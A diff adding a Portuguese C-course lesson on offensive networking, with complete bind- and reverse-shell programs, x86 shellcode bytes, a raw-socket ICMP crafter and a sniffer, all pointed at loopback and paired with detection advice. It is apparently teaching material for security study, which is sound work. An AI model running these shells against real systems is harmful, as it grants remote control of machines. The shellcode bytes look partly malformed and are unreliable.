@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>4.09 — Redes ofensivas em C: shells, shellcode e packet crafting — Aprenda C</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body data-trilha="4">
+<header class="site-header">
+  <a class="brand" href="../index.html">⌘ Aprenda <b>C</b></a>
+  <nav class="top-nav">
+    <a href="../index.html">Roadmap</a>
+    <a href="../exercicios/index.html">Exercícios</a>
+    <a href="../projetos/index.html">Projetos</a>
+  </nav>
+</header>
+<main class="modulo">
+  <nav class="breadcrumb"><a href="../index.html">Roadmap</a> / <a href="../index.html#t4">Trilha 4 — Cyber</a> / Redes ofensivas em C: shells, shellcode e packet crafting</nav>
+
+  <header class="mod-header">
+    <div class="mod-cab NUM">4.09</div>
+    <h1>Redes ofensivas em C: shells, shellcode e packet crafting</h1>
+    <p class="subtitulo">Sockets Linux, bind/reverse shell didáticos, raw sockets e sniffers (lab only)</p>
+    <div class="chips">
+      <span class="chip">Nível: Avançado/Cyber</span>
+      <span class="chip">Duração: ~50 min</span>
+      <span class="chip">Pré-requisitos: T3.08 (sockets TCP/UDP em C), T4.05 (shellcode/execve), T0.01</span>
+    </div>
+    <button class="btn btn-done" data-mod="t4-m09">Marcar concluído</button>
+  </header>
+
+  <section class="card objetivos">
+    <h2>🎯 Objetivos</h2>
+    <p>Aplicar sockets em C (retomando T3.08) em cenários de segurança: diferenciação bind shell × reverse shell com implementações didáticas completas (dup2 redirecionando fd 0/1/2), shellcode de bind/reverse de referência, packet crafting com raw sockets (ICMP manual) e um sniffer de cabeçalhos Ethernet/IP/TCP. Aviso transversal: TODOS os exemplos rodam apenas em lab, preferencialmente loopback.</p>
+  </section>
+
+  <section class="card leitura">
+  <h2>📖 Leitura guiada</h2>
+  
+  
+  <p class="foco"><strong>Foco da leitura:</strong> Releia o Beej de rede com o olhar de segurança: Beej's Guide to Network Programming (https://beej.us/guide/bgnet/) — capítulos de socket/bind/connect/accept. Para shellcode e transporte, consulte a Azeria Labs (https://azeria-labs.com/) — seções de shellcode (ARM e x86) e fundação do TCP/IP. Lembre a premissa do curso: rode tudo só em lab (loopback/VM).</p>
+</section>
+  <section class="card secao">
+  <h2>O terror que mora nos sockets (e a premissa do laboratório)</h2>
+  <p>Você já viu sockets em T3.08 para escrever clientes/servidores. Aqui o cenário vira segurança: um atacante usa <em>exatamente as mesmas syscalls</em> para criar canais de controle remoto (<strong>shells</strong>) e para forjar/inspccionar tráfego (<strong>raw sockets</strong>). O objetivo é que você reconheça esses padrões no <em>defensivo</em>: entender o que é um bind shell é a mesma coisa que ler um log de conexão suspeita e saber o que procurar.</p>
+<p><strong>Premissa inegociável:</strong> os exemplos abaixo usam <strong>loopback (127.0.0.1)</strong> e rodam apenas dentro do WSL2/VM. Nada de IP externo, nada de produção, nada de redes de terceiros. O código é estruturalmente idêntico ao "real" para fins de estudo — por isso o cuidado redobrado.</p>
+  
+  
+  
+</section>
+<section class="card secao">
+  <h2>Bind shell: o servidor que espera o atacante</h2>
+  <p>O <strong>bind shell</strong> abre uma porta e fica esperando uma conexão; a conexão que chega vira a shell. Padrão clássico de metasploits e malware de 2000s. Em lab, o defensor reconhece: um processo "servidor" escutando uma porta alta e inesperada.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — bind_shell.c (LAB ONLY)</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">/* bind_shell.c -- DIDATICO, LAB ONLY (loopback). Compile NO LINUX/WSL:
+   gcc -Wall -Wextra bind_shell.c -o bind_shell
+   Teste em outro terminal:  nc 127.0.0.1 4444 */
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+int main(void)
+{
+    int serv, cli;
+    struct sockaddr_in sa;
+
+    serv = socket(AF_INET, SOCK_STREAM, 0);
+    if (serv &lt; 0) { perror(&quot;socket&quot;); return 1; }
+
+    memset(&amp;sa, 0, sizeof sa);
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(4444);
+    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);   /* LAB: so loopback */
+
+    if (bind(serv, (struct sockaddr *)&amp;sa, sizeof sa) &lt; 0) { perror(&quot;bind&quot;); return 1; }
+    if (listen(serv, 1) &lt; 0) { perror(&quot;listen&quot;); return 1; }
+
+    printf(&quot;bind shell escutando 127.0.0.1:4444 (lab only)\n&quot;);
+    cli = accept(serv, NULL, NULL);
+    if (cli &lt; 0) { perror(&quot;accept&quot;); return 1; }
+
+    /* redireciona stdin/stdout/stderr para o socket */
+    dup2(cli, 0);
+    dup2(cli, 1);
+    dup2(cli, 2);
+
+    char *argv[] = { &quot;/bin/sh&quot;, NULL };
+    execve(&quot;/bin/sh&quot;, argv, NULL);
+    return 1;
+}</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>$ gcc -Wall -Wextra bind_shell.c -o bind_shell
+$ ./bind_shell &amp;
+bind shell escutando 127.0.0.1:4444 (lab only)
+$ nc 127.0.0.1 4444
+whoami
+voce
+id
+uid=1000(voce) gid=1000(voce) groups=...
+exit</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>Reverse shell: o cliente que conecta de volta</h2>
+  <p>O <strong>reverse shell</strong> inverte o fluxo: o alvo <em>conecta de volta</em> a um "listener" controlado pelo operador. Para o defensor é mais difícil de ver (não há porta nova escutando; é uma conexão de saída), por isso firewalls de borda monitoram exatamente conexões de saída estranhas. O padrão <code>socket → connect (trocos) → dup2 (0,1,2) → execve(/bin/sh)</code> é o esqueleto didático que você deve reconhecer em análise de malware.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — reverse_shell.c (LAB ONLY)</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">/* reverse_shell.c -- DIDATICO, LAB ONLY (conecta em 127.0.0.1).
+   Compile NO LINUX/WSL:  gcc -Wall -Wextra reverse_shell.c -o reverse_shell
+   Prenda o listener num segundo terminal:  nc -lvnp 4444   */
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+int main(void)
+{
+    struct sockaddr_in sa;
+    int s;
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s &lt; 0) { perror(&quot;socket&quot;); return 1; }
+
+    memset(&amp;sa, 0, sizeof sa);
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(4444);
+    inet_pton(AF_INET, &quot;127.0.0.1&quot;, &amp;sa.sin_addr);   /* LAB: loopback */
+
+    if (connect(s, (struct sockaddr *)&amp;sa, sizeof sa) &lt; 0) {
+        perror(&quot;connect&quot;);
+        return 1;
+    }
+
+    dup2(s, 0);   /* stdin  vem do socket */
+    dup2(s, 1);   /* stdout vai ao socket */
+    dup2(s, 2);   /* stderr vai ao socket */
+
+    char *argv[] = { &quot;/bin/sh&quot;, NULL };
+    execve(&quot;/bin/sh&quot;, argv, NULL);
+    perror(&quot;execve&quot;);
+    return 1;
+}</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>$ nc -lvnp 4444                 # terminal 1
+Listening on 0.0.0.0 4444
+$ ./reverse_shell                  # terminal 2 (lab)
+Connection from 127.0.0.1 ...
+$ id                               # shell chegou pelo socket
+uid=1000(voce) ...</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>dup2: a magia de três linhas</h2>
+  <p>O redirecionamento <code>dup2(s, 0/1/2)</code> duplica o descritor do socket sobre os descritores padrão: a partir daí, tudo que o shell escreve no stdout (descritor 1) sai pela rede, e o que chega da rede entra como stdin (descritor 0). <code>execve</code> substitui o processo pelo <code>/bin/sh</code> <em>sem fechar os descritores</em> — a shell nasce "plugada" no socket. Reconhecer essa sequência (socket + dup2×3 + execve) é a assinatura clássica em binários maliciosos e em shellcode.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — dup2 em detalhe</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">dup2(s, 0);   /* stdin  &lt;- socket  */
+dup2(s, 1);   /* stdout -&gt; socket  */
+dup2(s, 2);   /* stderr -&gt; socket  */
+execve(&quot;/bin/sh&quot;, argv, NULL);</code></pre>
+</div>
+  
+</section>
+<section class="card secao">
+  <h2>Shellcode de bind e reverse: payloads de referência</h2>
+  <p>Os blocos de instruções equivalentes, prontos como bytes (x86-32, porta <strong>4444</strong>; o reverse conecta em <strong>127.0.0.1</strong>). O bind faz socket→bind→listen→accept→dup2×3→execve; o reverse faz socket→connect→dup2×3→execve. <strong>Caveat honesto:</strong> estes são payloads clássicos de referência — no seu lab, encapsule-os num runner 32-bit (como o módulo 05, com execstack) e valide que respondem; se algum byte divergir na sua distro, ajuste conforme os sockets C deste módulo (que são a fonte de verdade didática). Nunca use sem ambiente isolado.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — shellcode x86_32 de referencia</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">/* BIND SHELL  x86/32  porta 4444  (referencia, lab only)
+   \x31\xdb\xf7\xe3\x53\x43\x53\x43\x53\x89\xe1\xb0\x66\xcd\x80
+   \x95\x52\x68\x11\x5c\x11\x05\x66\x53\x89\xe1\x6a\x10\x51\
+   \x55\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xcd\x80\x52\x52\x55\
+   \x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\x6a\x3f\x58\xcd\x80
+   \x49\x79\xf8\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\
+   \x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+
+/* REVERSE SHELL x86/32 porta 4444 -&gt; 127.0.0.1 (referencia, lab only)
+   \x31\xc0\x50\x6a\x01\x6a\x02\x6a\x66\x89\xe1\x89\xc7\xcd\x80
+   \x89\xc3\x31\xc9\x6a\x66\x58\x89\xe1\xcd\x80
+   \x66\x68\x11\x5c\x68\x7f\x00\x00\x01\x6a\x10\x51\x53\x56
+   \x31\xc0\x6a\x66\x58\x89\xe1\xcd\x80
+   \x31\xc9\x6a\x3f\x58\xcd\x80\x41\x83\xf9\x04\x75\xf4
+   \x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
+   \x51\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</code></pre>
+</div>
+  
+</section>
+<section class="card secao">
+  <h2>Packet crafting: um ICMP ECHO manual (raw socket)</h2>
+  <p><strong>Raw sockets</strong> deixam o processo montar cabeçalhos e enviar pacotes com o formato que quiser (requer root: <code>sudo</code>). Este exemplo constrói um ICMP echo do zero e o envia para o alvo — o "hello world" do packet crafting, sem tocar em <code>ping</code>. Em defesa: forjar pacotes é pré-requisito para entender IDS, spoofing e o que um honeypot registra.</p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — ping_raw.c (root)</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">/* ping_raw.c -- ICMP echo manual via socket RAW (neces. root, LAB).
+   gcc -Wall -Wextra ping_raw.c -o ping_raw   (NO LINUX/WSL)
+   sudo ./ping_raw    (raw socket exige root no Linux) */
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/ip_icmp.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+static unsigned short checksum(void *buf, size_t n)
+{
+    unsigned short *p = buf;
+    unsigned int soma = 0;
+    while (n &gt; 1) { soma += *p++; n -= 2; }
+    if (n) soma += *(unsigned char *)p;
+    soma = (soma &gt;&gt; 16) + (soma &amp; 0xffff);
+    soma += (soma &gt;&gt; 16);
+    return (unsigned short)~soma;
+}
+
+int main(void)
+{
+    int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (s &lt; 0) { perror(&quot;socket (raw precisa de root)&quot;); return 1; }
+
+    char pacote[64];
+    memset(pacote, 0, sizeof pacote);
+
+    struct icmphdr *icmp = (struct icmphdr *)pacote;
+    icmp-&gt;type = ICMP_ECHO;                 /* 8 */
+    icmp-&gt;code = 0;
+    icmp-&gt;un.echo.id = htons(1);
+    icmp-&gt;un.echo.sequence = htons(1);
+    icmp-&gt;checksum = checksum(pacote, sizeof pacote);
+
+    struct sockaddr_in alvo;
+    memset(&amp;alvo, 0, sizeof alvo);
+    alvo.sin_family = AF_INET;
+    inet_pton(AF_INET, &quot;127.0.0.1&quot;, &amp;alvo.sin_addr);
+
+    sendto(s, pacote, sizeof pacote, 0,
+           (struct sockaddr *)&amp;alvo, sizeof alvo);
+    printf(&quot;ICMP echo (64 bytes ICMP) enviado a 127.0.0.1\n&quot;);
+    close(s);
+    return 0;
+}</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>$ sudo ./ping_raw
+ICMP echo (64 bytes ICMP) enviado a 127.0.0.1
+# confira a chegada no lado do sniffer (proxima secao) ou com tcpdump -i lo icmp.</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>Sniffer: ler Ethernet/IP/TCP de quem passa</h2>
+  <p>Um <strong>sniffer</strong> usa socket raw passivo (<code>SOCK_RAW, IPPROTO_TCP</code>) para <em>receber</em> cópias dos pacotes que o kernel vê, e imprime endereço:porta origem/destino de cada TCP. Para ler cabeçalho Ethernet de verdade usaríamos <code>SOCK_RAW, htons(ETH_P_ALL)</code> (interface) — aqui priorizamos IP/TCP que é o suficiente para o padrão de estudo. <strong>Só em lab/loopback.</strong></p>
+  
+  <div class="code-block">
+  <div class="code-head"><span>Código — sniffer.c (root, LAB)</span><button class="copy-btn" type="button">copiar</button></div>
+  <pre class="code"><code class="language-c">/* sniffer.c -- le pacotes TCP do sistema (LAB, precisa de root).
+   gcc -Wall -Wextra sniffer.c -o sniffer   (NO LINUX/WSL)
+   sudo ./sniffer                            (root)
+   Em outro terminal, gere trafego: nc 127.0.0.1 4444 (loopback). */
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/ip.h&gt;
+#include &lt;netinet/tcp.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+int main(void)
+{
+    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (s &lt; 0) { perror(&quot;socket (root? linux?)&quot;); return 1; }
+
+    unsigned char buf[65536];
+    for (int i = 0; i &lt; 8; i++) {           /* le 8 pacotes e para */
+        ssize_t n = recv(s, buf, sizeof buf, 0);
+        if (n &lt; 0) { perror(&quot;recv&quot;); break; }
+
+        struct iphdr *ip = (struct iphdr *)buf;
+        struct tcphdr *tcp = (struct tcphdr *)(buf + ip-&gt;ihl * 4);
+        char saddr[INET_ADDRSTRLEN], daddr[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &amp;ip-&gt;saddr, saddr, sizeof saddr);
+        inet_ntop(AF_INET, &amp;ip-&gt;daddr, daddr, sizeof daddr);
+        printf(&quot;%s:%u -&gt; %s:%u (bytes %zd, flags %s%s)\n&quot;,
+               saddr, ntohs(tcp-&gt;source),
+               daddr, ntohs(tcp-&gt;dest), n,
+               tcp-&gt;syn ? &quot;SYN &quot; : &quot;&quot;, tcp-&gt;ack ? &quot;ACK&quot; : &quot;&quot;);
+    }
+    close(s);
+    return 0;
+}</code></pre>
+</div>
+  <div class="output-block">
+  <div class="code-head"><span>Saída esperada</span></div>
+  <pre class="output"><code>$ sudo ./sniffer &amp;
+$ nc 127.0.0.1 4444 &lt; /dev/null
+127.0.0.1:37614 -&gt; 127.0.0.1:4444 (bytes 62, flags SYN )
+127.0.0.1:4444 -&gt; 127.0.0.1:37614 (bytes 60, flags SYN ACK)
+127.0.0.1:37614 -&gt; 127.0.0.1:4444 (bytes 60, flags ACK)</code></pre>
+</div>
+</section>
+<section class="card secao">
+  <h2>Detecção e segurança de rede (o lado defensivo do tráfego)</h2>
+  <p>Entender o tráfego é metade da detecção:</p>
+  <ul><li><strong>Conexões de saída inesperadas</strong> (reverse shells) — proxys/firewalls de borda monitoram exatamente "processo nosso conversando com destino estranho"; em Linux, <code>ss -tpn</code> e <code>lsof -i</code> mostram quem fala com quem.</li>
+<li><strong>Portas altas escutando</strong> (bind shells) — audite com <code>ss -tlnp</code>; porta aberta sem dono documentado é suspeita.</li>
+<li><strong>Raw sockets em processos</strong> — <code>ss</code>/<code>lsof</code> indicam; root + raw socket não visto em inventário = candidato a sniffing.</li>
+<li><strong>Criptografia</strong>: tráfego legítimo é TLS (<code>tcpdump -w cap.pcap</code> + Wireshark); payload de shell costuma vir em texto claro no lab — por isso malware moderno "fala" com cripto e usando canais mimetizando HTTP/TLS. A defesa inclui visibilidade (captura + análise) e não confiar em "parece HTTP".</li>
+<li><strong>Firewall/IDS</strong>: regras de zona (nunca plataforma da lab na rede de produção), <em>e ingressos de saída</em> para o perímetro. O lab usa loopback justamente para nada escapar da máquina.</li></ul>
+  
+  
+</section>
+<section class="card secao">
+  <h2>Como se defender</h2>
+  
+  <ul><li>Mapeie o tráfego do seu sistema: faça inventário de portas escutando (<code>ss -tlnp</code>), conexões ativas (<code>ss -tpn</code>) e processos com raw sockets ou <code>/proc</code> suspeito.</li>
+<li>Bloqueie saída não esperada no firewall/perímetro — reverse shell só funciona se a saída existe.</li>
+<li>Isolar segmentos: servidor crítico nunca "conversa" livremente; microssegmentação limita o raio de um bind/reverse.</li>
+<li>Criptografe em trânsito e valide certificados/pinning — tráfego claro é capturável por qualquer pega na rede.</li>
+<li>Mantenha IDS/visibilidade: capture (tcpdump/Wireshark) e correlacione — um "ECP explicável" do lab agora é o "fluxo destoante" que você reconhecerá em produção.</li>
+<li>Rode estes exemplos SOMENTE em loopback/VM; se precisar demonstrar para terceiros, use rede isolada com consentimento por escrito.</li></ul>
+  
+  
+</section>
+  <section class="card exs"><h2>✏️ Exercícios</h2><div class="exercicio" id="ex-1" data-mod="t4-m09">
+  <div class="ex-head">
+    <span class="badge badge-nivel n2">Nível 2</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.09.1</p>
+  <p class="enunciado">Compile e rode o <code>bind_shell</code> em loopback, conecte com <code>nc 127.0.0.1 4444</code> e execute <code>whoami; id; pwd</code>. Explique o papel das chamadas socket, bind, listen, accept, dup2 e execve nesse fluxo.</p>
+  <p class="dica"><strong>Dica:</strong> Trace a sequência como um diagrama: cada syscall é um passo do "protocolo" do servidor. As três dup2 são o redirecionamento.</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">$ gcc -Wall -Wextra bind_shell.c -o bind_shell
+$ ./bind_shell &amp;
+$ nc 127.0.0.1 4444
+whoami
+voce
+id
+uid=1000(voce) ...
+pwd
+/home/voce/labs/4.09
+exit</code></pre>
+        <p class="obs">socket(2) cria o descritor; bind amarra o endereço/porta; listen declara "serviço"; accept entrega o descritor do cliente; dup2 reamarra os fds padrão; execve vira a shell reutilizando os descritores.</p></details>
+</div>
+<div class="exercicio" id="ex-2" data-mod="t4-m09">
+  <div class="ex-head">
+    <span class="badge badge-nivel n2">Nível 2</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.09.2</p>
+  <p class="enunciado">Refaça com o <code>reverse_shell</code>: terminal 1 roda <code>nc -lvnp 4444</code>; terminal 2 (mesmo lab) roda o reverse. Quando a conexão aparece, digite <code>hostname; whoami</code>. Depois troque o sufixo: conecte para um IP/porta ERRADO e mostre a mensagem de erro do connect.</p>
+  <p class="dica"><strong>Dica:</strong> O nc é o "listener"; o reverse é o "cliente". Para o erro, use uma porta ocupada ou IP x.x.x.x sem dono.</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">$ nc -lvnp 4444   # terminal 1
+Listening on 0.0.0.0 4444
+$ ./reverse_shell  # terminal 2
+Connection from 127.0.0.1 56120
+hostname
+NC-LAB4
+whoami
+voce
+
+# Caso o connect falhe:
+$ ./reverse_shell  (com 4567 sem listener)
+connect: Connection refused</code></pre>
+        </details>
+</div>
+<div class="exercicio" id="ex-3" data-mod="t4-m09">
+  <div class="ex-head">
+    <span class="badge badge-nivel n3">Nível 3</span>
+    <span class="ex-actions"><label class="check-ex"><input type="checkbox" class="ex-done"> concluído</label></span>
+  </div>
+  <p class="num-ex">Exercício 4.09.3</p>
+  <p class="enunciado">Rode o <code>sniffer</code> com root e, em paralelo, o <code>ping_raw</code>. Identifique no output do sniffer se o ICMP aparece (confira com <code>type</code> no parser) e depois gere um TCP arbitrário (nc) e confirme que SYN/ACK/portas aparecem. Registre 4 pacotes TCP no output.</p>
+  <p class="dica"><strong>Dica:</strong> O sniffer só captura TCP (IPPROTO_TCP). Para ver o ICMP manual, acrescente <code>case IPPROTO_ICMP</code> e imprima tipo/código — o exercício é exatamente adicionar esse caso.</p>
+  <details class="solucao"><summary>Ver solução</summary><pre class="code"><code class="language-c">   /* adaptacao didatica (bonus do exercicio): imprimir tambem ICMP */
+     case IPPROTO_ICMP: {
+        struct icmphdr *icmp = (struct icmphdr *)(buf + ip-&gt;ihl * 4);
+        printf(&quot;ICMP type=%u code=%u\n&quot;, icmp-&gt;type, icmp-&gt;code);
+        break;
+     }</code></pre>
+        <p class="obs">Ao rodar sudo ./ping_raw, você verá type=8 (echo request). Isso conecta o packet crafting à recepção.</p></details>
+</div></section>
+  
+<section class="card quiz-card" data-quiz-json='[{&quot;pergunta&quot;:&quot;Qual a diferença prática entre bind shell e reverse shell?&quot;,&quot;opcoes&quot;:[&quot;Bind escuta uma porta (servidor); reverse conecta de volta a um listener (cliente)&quot;,&quot;Bind usa UDP e reverse usa TCP&quot;,&quot;Bind roda em Windows e reverse em Linux&quot;,&quot;Não há diferença&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;Bind abre porta e espera; reverse inicia a conexão para fora — mais difícil de ver no perímetro.&quot;},{&quot;pergunta&quot;:&quot;O que a sequência dup2(s,0); dup2(s,1); dup2(s,2) faz?&quot;,&quot;opcoes&quot;:[&quot;Redireciona stdin/stdout/stderr para o socket, plugando a shell na rede&quot;,&quot;Imprime o endereço do socket&quot;,&quot;Fechar o socket após o exec&quot;,&quot;Duplica o processo principal&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;Os fds padrão passam a apontar o socket; depois execve mantém os descritores e a shell nasce conectada.&quot;},{&quot;pergunta&quot;:&quot;Por que um firewall de borda monitora conexões de saída inesperadas?&quot;,&quot;opcoes&quot;:[&quot;Porque reverse shells são exatamente conexões de saída do alvo para um operador externo&quot;,&quot;Porque toda conexão de saída é ilegal&quot;,&quot;Para bloquear atualizações&quot;,&quot;Para cachear navegação&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;Não há porta nova escutando no alvo; o indicador é o fluxo de saída atípico para destinos não esperados.&quot;},{&quot;pergunta&quot;:&quot;O que um raw socket (SOCK_RAW) habilita e o que ele exige?&quot;,&quot;opcoes&quot;:[&quot;Montar/enviar pacotes com cabeçalhos próprios; requer root no Linux&quot;,&quot;Enviar pacotes em Ethernet; não requer permissão&quot;,&quot;Apenas receber sites&quot;,&quot;Fazer DNS&quot;],&quot;correta&quot;:0,&quot;explicacao&quot;:&quot;Raw permite forjar e inspecionar no nível de IP/ICMP/TCP; no Linux exige privilégio de root.&quot;}]'>
+  <h2>❓ Verificação rápida</h2>
+  <div class="quiz-root"></div>
+</section>
+  <section class="card projeto">
+  <h2>🏗️ Miniprojeto: Demonstração de rede em loopback + guia para o defensor</h2>
+  <p>Monte a pasta <code>~/labs/4.09</code> com: (1) uma demonstração completa rodando — listener nc e reverse_shell conectando, com output capturado dos dois lados; (2) o bind_shell com registro de tcpdump (<code>sudo tcpdump -i lo -w cap.pcap</code>) e uma decodificação mínima mostrando o handshake; (3) o sniffer imprimindo os pacotes do seu próprio teste; (4) um arquivo <code>defensor.md</code> com o "playbook": comandos (ss -tlnp, ss -tpn, lsof -i, tcpdump), o que olhar em cada um e as 3 features que você monitoraria num endpoint para detectar esses padrões.</p>
+  <div class="criterios"><h3>Critérios de aceite</h3><ul><li>reverse_shell + nc funcionando no lab com output dos dois terminais.</li><li>bind_shell testado via nc e pacotes capturados com tcpdump/analisados.</li><li>sniffer imprimindo TCP do próprio teste (ou do exercício 3).</li><li>Playbook defensor.md com comandos e sinais de detecção.</li></ul></div>
+</section>
+  <nav class="mod-nav"><a class="btn nav-prev" href="heap-integer-overflow-e-use-after-free.html">← 4.08 Heap, integer overflow e use-after-free</a><a class="btn nav-next" href="capstone-ctf-pwn-auditoria-definitiva.html">4.10 Capstone: CTF pwn + auditoria definitiva →</a></nav>
+  <div class="mod-nav done-nav"><button class="btn btn-done" data-mod="t4-m09">Marcar concluído</button></div>
+</main>
+<footer class="site-footer">
+  <p>Aprenda C — guia progressivo com Beej's Guide, King e conteúdo original.</p>
+</footer>
+<script src="../assets/js/progress.js"></script>
+<script src="../assets/js/highlight.js"></script>
+<script src="../assets/js/quiz.js"></script>
+</body>
+</html>
